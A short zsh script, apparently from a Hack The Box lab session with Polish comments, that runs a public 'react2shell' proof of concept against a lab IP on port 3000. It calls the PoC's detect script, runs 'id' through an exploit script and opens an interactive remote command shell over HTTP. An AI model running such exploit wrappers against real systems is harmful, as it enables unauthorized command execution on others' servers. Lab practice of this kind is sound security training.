#!/bin/zsh
# PoC: github.com/freeqaz/react2shell — BEZ reverse shell (output w HTTP)
POC=~/Desktop/htb/ReactorWatch/scripts/react2shell-poc/react2shell
TARGET=http://10.129.245.214:3000
cd "$POC" || exit 1
chmod +x *.sh
echo "=== detect ==="
./detect.sh "$TARGET"
echo ""
echo "=== id (exploit-redirect) ==="
./exploit-redirect.sh "$TARGET" "id"
echo ""
echo "=== interaktywny shell (wpisuj komendy, exit = quit) ==="
./shell.sh "$TARGET"
